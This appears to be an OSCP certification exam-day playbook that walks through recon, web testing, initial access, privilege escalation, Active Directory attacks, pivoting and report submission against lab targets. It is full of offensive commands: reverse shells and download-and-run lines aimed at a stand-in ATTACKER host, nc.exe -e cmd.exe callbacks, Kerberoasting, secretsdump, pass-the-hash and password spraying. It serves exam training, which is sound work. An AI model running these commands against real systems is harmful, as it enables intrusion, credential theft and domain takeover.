# Husky Hacker — OSCP Exam Day Workflow

**Your complete playbook from VPN connect to report submit. Every phase, every tool, every command.**

November 11, 2026 — Let's get it.

---

## Pre-Exam Setup (Do This the Night Before)

```bash
# 1. Run toolbox to make sure everything is downloaded
./toolbox.sh

# 2. Initialize your report workspace
python3 report.py init
# Enter your OSID, email, exam date

# 3. Verify your tools work
revshell --list
xfind search "Apache 2.4" --exact
adchain list
pivot interfaces

# 4. Set up tmux layout (or screen)
tmux new -s exam
# Pane 1: Tool server
# Pane 2: Working terminal
# Pane 3: Listener
# Pane 4: Notes

# 5. Start serving tools (leave running entire exam)
cd ~/oscp-tools && python3 -m http.server 80
```

---

## Phase 0: Exam Start (First 5 Minutes)

```bash
# Connect VPN
sudo openvpn OS-XXXXX-OSCP.ovpn

# Note your tun0 IP
ip addr show tun0 | grep inet

# Open exam control panel — note all target IPs and objectives
# Add machines to report immediately
report add Standalone1 10.10.10.X --os Linux --points 20
report add Standalone2 10.10.10.X --os Windows --points 20
report add Standalone3 10.10.10.X --os Linux --points 20
report add AD-MS01 10.10.10.X --os Windows --points 10 --domain YOURDOMAIN
report add AD-MS02 10.10.10.X --os Windows --points 10 --domain YOURDOMAIN
report add AD-DC01 10.10.10.X --os Windows --points 20 --domain YOURDOMAIN
```

---

## Phase 1: Recon — All Targets at Once (First 15 Minutes)

**Fire these off in parallel and move on while they run.**

```bash
# Terminal 1 — Standalone 1
sudo huskyrecon 10.10.10.X -o ./recon/standalone1 &

# Terminal 2 — Standalone 2
sudo huskyrecon 10.10.10.X -o ./recon/standalone2 &

# Terminal 3 — Standalone 3
sudo huskyrecon 10.10.10.X -o ./recon/standalone3 &

# Terminal 4 — AD set (first machine, you'll have creds)
sudo huskyrecon 10.10.10.X -o ./recon/ad-ms01 -d YOURDOMAIN &
```

**While scans run, check the AD starting creds from the control panel.**

---

## Phase 2: Triage — Pick Your First Target (Minute 15)

```bash
# Check what huskyrecon found — quick wins first
cat ./recon/standalone1/SUMMARY.txt
cat ./recon/standalone2/SUMMARY.txt
cat ./recon/standalone3/SUMMARY.txt

# Run fruitpicker on each for fast low-hanging fruit check
sudo fruitpicker 10.10.10.X --ports "22/ssh,80/http,445/smb"

# Feed nmap results into exploit finder
xfind nmap ./recon/standalone1/nmap/quick_tcp.txt
xfind nmap ./recon/standalone2/nmap/quick_tcp.txt
xfind nmap ./recon/standalone3/nmap/quick_tcp.txt
```

**Pick the box with the best leads — go in this order:**
1. Box with a known RCE exploit found by xfind
2. Box with anonymous FTP/SMB access
3. Box with a web app (login forms, upload, CMS)
4. Save the hardest-looking one for last

**Record your choice:**
```bash
report note Standalone1 enum "Starting here — HTTP on 80, Apache 2.4.49 found by xfind"
```

---

## Phase 3: Standalone Box — Web Enumeration

```bash
# Deep web enum on the HTTP port
python3 webrecon.py http://10.10.10.X -o ./recon/standalone1/web

# Check what webrecon found
# Look for: login pages, upload forms, interesting paths, tech detected

# Test any input points you find
# Login form → SQLi test
python3 webtester.py sqli -u "http://10.10.10.X/login.php" --param user -m POST

# Search/filter parameter → command injection test
python3 webtester.py cmdi -u "http://10.10.10.X/search.php" --param q

# File parameter → LFI test
python3 webtester.py lfi -u "http://10.10.10.X/index.php" --param page

# Upload form → test what gets accepted
python3 webtester.py upload -u "http://10.10.10.X/upload.php" --field file

# Found a known service version? Search for exploits
xfind search "Drupal 7.54"
xfind cve CVE-2018-7600
xfind github "drupalgeddon2"
```

**Record as you go:**
```bash
report ports Standalone1 22/ssh 80/http 3306/mysql
report step Standalone1 initial "Found SQL injection in login form" \
  -c "python3 webtester.py sqli -u 'http://10.10.10.X/login.php' --param user -m POST" \
  -s screenshots/sqli_confirm.png
```

---

## Phase 4: Standalone Box — Initial Access

```bash
# Got a working exploit? Get a shell.

# Generate your reverse shell payload
revshell -l bash -p 4444
revshell -l nc-mkfifo -p 4444
revshell -l python -p 4444
revshell -l powershell-b64 -p 4444        # Windows
revshell -l busybox -p 4444                # containers

# Need it URL-encoded for injection?
revshell -l bash -p 4444 --encode url

# Need it base64 wrapped?
revshell -l bash -p 4444 --wrap-b64

# Start listener
revshell --listen -p 4444 --rlwrap

# After catching shell — stabilize immediately
revshell --stabilize
# python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
# stty raw -echo; fg
# export TERM=xterm-256color
```

**Record the foothold:**
```bash
report step Standalone1 initial "Exploited SQLi for RCE" \
  -c "sqlmap -u '...' --os-shell" \
  -s screenshots/initial_shell.png
report vuln Standalone1 initial "SQL Injection (UNION-based)" \
  --desc "The search parameter was vulnerable to UNION-based SQL injection"
```

---

## Phase 5: Standalone Box — Privilege Escalation

### Linux Target

```bash
# Upload and run privesc enum
wget http://ATTACKER/linux/linpeas.sh -O /tmp/lp.sh && bash /tmp/lp.sh | tee /tmp/lp_out.txt

# Or use your custom one
wget http://ATTACKER:8000/privesc.sh && bash privesc.sh

# pspy for cron jobs
wget http://ATTACKER/linux/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy

# Check the basics manually
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
ls -la /etc/passwd
ss -tlnp
```

### Windows Target

```powershell
# PrivescCheck (most thorough)
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/windows/PrivescCheck.ps1'); Invoke-PrivescCheck"

# PowerUp
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/windows/PowerUp.ps1'); Invoke-AllChecks"

# Check privileges
whoami /priv
whoami /groups

# SeImpersonatePrivilege? → Potato
certutil -urlcache -f http://ATTACKER/windows/potatoes/GodPotato-NET4.exe C:\Temp\gp.exe
C:\Temp\gp.exe -cmd "cmd /c C:\Temp\nc.exe ATTACKER 4444 -e cmd.exe"

# winPEAS if PowerShell is restricted
certutil -urlcache -f http://ATTACKER/windows/winPEASx64.exe C:\Temp\wp.exe
C:\Temp\wp.exe
```

**Record the privesc:**
```bash
report step Standalone1 privesc "Found SUID binary /usr/bin/custom_backup" \
  -c "find / -perm -4000 -type f 2>/dev/null" \
  -s screenshots/suid_find.png
report vuln Standalone1 privesc "SUID binary path injection"
```

---

## Phase 6: Capture Flags

```bash
# Linux
cat /home/*/local.txt
cat /root/proof.txt
hostname && ip addr && cat /root/proof.txt   # screenshot this!

# Windows
type C:\Users\*\Desktop\local.txt
type C:\Users\Administrator\Desktop\proof.txt
hostname && ipconfig && type C:\Users\Administrator\Desktop\proof.txt   # screenshot!
```

**CRITICAL: Submit flags in the control panel AND screenshot with IP showing.**

```bash
report flag Standalone1 local "abc123def456"
report flag Standalone1 proof "789xyz000111"
```

---

## Phase 7: AD Set — Methodology

**You get starting creds. The chain is usually:**
`Given creds → foothold on MS01 → escalate → pivot → MS02 → pivot → DC01`

### Step 1: Initial Access with Given Creds

```bash
# Try the creds everywhere
crackmapexec smb 10.10.10.X -u 'given_user' -p 'given_pass' -d DOMAIN
crackmapexec winrm 10.10.10.X -u 'given_user' -p 'given_pass' -d DOMAIN

# If WinRM works
evil-winrm -i 10.10.10.X -u 'given_user' -p 'given_pass'

# If RDP
xfreerdp /v:10.10.10.X /u:given_user /p:'given_pass' /d:DOMAIN +clipboard
```

### Step 2: AD Enumeration

```bash
# BloodHound collection from Linux
bloodhound-python -u 'given_user' -p 'given_pass' -d DOMAIN -ns DC_IP -c All

# Or SharpHound from Windows foothold
certutil -urlcache -f http://ATTACKER/ad/SharpHound.exe C:\Temp\sh.exe
C:\Temp\sh.exe --CollectionMethods All

# PowerView
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/ad/PowerView.ps1')"
Get-DomainUser | select samaccountname,description
Get-DomainGroup -AdminCount | select samaccountname
Find-DomainShare -CheckShareAccess

# Kerberoast
impacket-GetUserSPNs 'DOMAIN/user:pass' -dc-ip DC_IP -request -outputfile kerb.hash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt

# AS-REP Roast
impacket-GetNPUsers 'DOMAIN/' -usersfile users.txt -no-pass -dc-ip DC_IP
```

### Step 3: BloodHound → Attack Chain

```bash
# Import the .zip into BloodHound, find the shortest path
# Then use adchain to get exact commands:

adchain chain "given_user>GenericAll>svc_sql>DCSync>domain" \
  -d DOMAIN --dc-ip DC_IP -p 'given_pass'

# Or look up individual relationships:
adchain lookup GenericAll -s given_user -t svc_sql -d DOMAIN --dc-ip DC_IP -p 'given_pass'
adchain lookup "Kerberoasting" -d DOMAIN --dc-ip DC_IP -s given_user -p 'given_pass'
```

### Step 4: Lateral Movement & Pivoting

```bash
# Got new creds? Try them everywhere
crackmapexec smb 10.10.10.0/24 -u 'new_user' -p 'new_pass' -d DOMAIN --continue-on-success

# Need to pivot to internal network?
pivot ligolo -a YOUR_TUN0_IP -p PIVOT_HOST_IP -n INTERNAL_NET/24

# Or quick chisel SOCKS
pivot chisel -a YOUR_TUN0_IP -p PIVOT_HOST_IP

# REMEMBER: reverse shells from internal hosts target the PIVOT HOST IP, not your tun0!
```

### Step 5: Domain Admin → DC

```bash
# Got DCSync rights? Dump everything
impacket-secretsdump 'DOMAIN/user:pass'@DC_IP

# Got Administrator NTLM hash? PtH
impacket-psexec 'DOMAIN/Administrator'@DC_IP -hashes :NTLM_HASH
evil-winrm -i DC_IP -u Administrator -H 'NTLM_HASH'

# Grab the flag
type C:\Users\Administrator\Desktop\proof.txt
```

---

## Phase 8: If You're Stuck

### Stuck on Initial Access

```bash
# Re-run recon with bigger wordlists
python3 webrecon.py http://TARGET -w /usr/share/seclists/Discovery/Web-Content/big.txt

# Check UDP
sudo nmap -sU --top-ports 50 TARGET

# Try different extensions in directory scan
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,asp,aspx,jsp,html,txt,bak,old,conf,zip,sql,xml,json

# Re-read your nmap output carefully — missed a port?
cat ./recon/TARGET/nmap/full_tcp.txt

# Search for exploits with different terms
xfind search "service_name version"
xfind github "CVE-XXXX-XXXXX"

# Check default credentials for any service you found
# https://github.com/ihebski/DefaultCreds-cheat-sheet
```

### Stuck on Privesc

```bash
# Linux — run everything
bash privesc.sh
linpeas.sh | tee linpeas_out.txt
./pspy64                    # watch for 3-5 minutes for cron jobs
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
cat /etc/crontab
ls -la /opt /var/backups /tmp

# Windows — run everything
PrivescCheck → Invoke-PrivescCheck -Extended
PowerUp → Invoke-AllChecks
winPEAS
whoami /priv                # SeImpersonate is your best friend
cmdkey /list                # stored creds
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  # autologon
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Stuck on AD

```bash
# Re-check BloodHound — look at:
# - Shortest path to Domain Admins
# - Kerberoastable users
# - AS-REP Roastable users
# - Users with DCSync rights
# - Group memberships of your compromised user

# Try password spraying with any creds you've found
crackmapexec smb DC_IP -u users.txt -p 'found_password' -d DOMAIN --continue-on-success

# Check shares with every user you've compromised
crackmapexec smb DC_IP -u 'user' -p 'pass' --shares

# Look for credentials in shares, description fields, scripts
Get-DomainUser | select samaccountname,description | fl
```

---

## Phase 9: Report (After Exam Ends)

```bash
# Check your progress
report status

# Fill in any gaps — add steps you forgot during the exam
report step Standalone1 initial "Ran nmap scan" \
  -c "nmap -sCV -p- --open 10.10.10.X" \
  -s screenshots/nmap.png

# Generate the report
report generate -o OSCP_Exam_Report.md

# If pandoc is installed, it auto-generates PDF too
# If not, use any markdown → PDF converter

# Package for submission
# Report must be: OSCP-OS-XXXXX-Exam-Report.pdf
# Archive: OSCP-OS-XXXXX-Exam-Report.7z (no password)
7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf

# Verify MD5
md5sum OSCP-OS-XXXXX-Exam-Report.7z

# Upload to https://upload.offsec.com
# Verify the MD5 matches, click Submit
```

---

## Time Management

| Time Block | What To Do |
|---|---|
| **0:00 – 0:15** | VPN connect, fire off huskyrecon on all targets, init report |
| **0:15 – 0:30** | Triage results, pick first target, start deep enum |
| **0:30 – 3:00** | First standalone box (initial access + privesc) |
| **3:00 – 3:15** | Break — walk away from the desk |
| **3:15 – 6:00** | Second standalone box |
| **6:00 – 6:30** | Break — eat a real meal |
| **6:30 – 10:00** | AD set (all 3 machines) |
| **10:00 – 10:15** | Break |
| **10:15 – 13:00** | Third standalone or continue AD |
| **13:00 – 14:00** | Break — nap if needed |
| **14:00 – 18:00** | Finish remaining targets, retry stuck ones |
| **18:00 – 23:45** | Buffer time — clean up, grab missed screenshots |
| **After exam** | 24 hours to write and submit report |

**Rules:**
- Don't spend more than 2.5 hours on one box without switching
- Screenshot EVERYTHING — flags with IP, exploit output, shell proof
- Submit flags in the control panel AS SOON as you get them
- Use Metasploit on your LAST box only (if needed)
- Take breaks — your brain needs them

---

## Passing Scenarios (70 points needed)

| AD (40 pts) | Standalone 1 (20) | Standalone 2 (20) | Standalone 3 (20) | Total |
|---|---|---|---|---|
| Full (40) | local (10) | local (10) | local (10) | **70** ✓ |
| Full (40) | local (10) | Full (20) | — | **70** ✓ |
| Partial (20) | Full (20) | Full (20) | local (10) | **70** ✓ |
| Partial (10) | Full (20) | Full (20) | Full (20) | **70** ✓ |
| Full (40) | Full (20) | Full (20) | — | **80** |
| Full (40) | Full (20) | Full (20) | Full (20) | **100** |

**The AD set is worth 40 points. Prioritize it.**

---

## Quick Reference — Hashcat Modes

| Hash | Mode | Crack Command |
|---|---|---|
| NTLM | 1000 | `hashcat -m 1000 hash rockyou.txt` |
| NTLMv2 | 5600 | `hashcat -m 5600 hash rockyou.txt` |
| Kerberoast | 13100 | `hashcat -m 13100 hash rockyou.txt` |
| AS-REP | 18200 | `hashcat -m 18200 hash rockyou.txt` |
| MD5 | 0 | `hashcat -m 0 hash rockyou.txt` |
| SHA-512 crypt | 1800 | `hashcat -m 1800 hash rockyou.txt` |
| bcrypt | 3200 | `hashcat -m 3200 hash rockyou.txt` |
| KeePass | 13400 | `hashcat -m 13400 hash rockyou.txt` |

---

## Quick Reference — File Transfer

### To Linux Target

```bash
wget http://ATTACKER/file -O /tmp/file
curl http://ATTACKER/file -o /tmp/file
scp kali@ATTACKER:/path/file /tmp/file
nc -lvnp 4444 > file     # target
nc TARGET 4444 < file     # attacker
```

### To Windows Target

```powershell
certutil -urlcache -f http://ATTACKER/file C:\Temp\file
Invoke-WebRequest -Uri http://ATTACKER/file -OutFile C:\Temp\file
(New-Object Net.WebClient).DownloadFile('http://ATTACKER/file','C:\Temp\file')
copy \\ATTACKER\share\file C:\Temp\file    # SMB
```

---

## Quick Reference — Reverse Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
stty rows 40 cols 160
```

---

*"You have to take it one shell at a time."* — The Husky Hacker
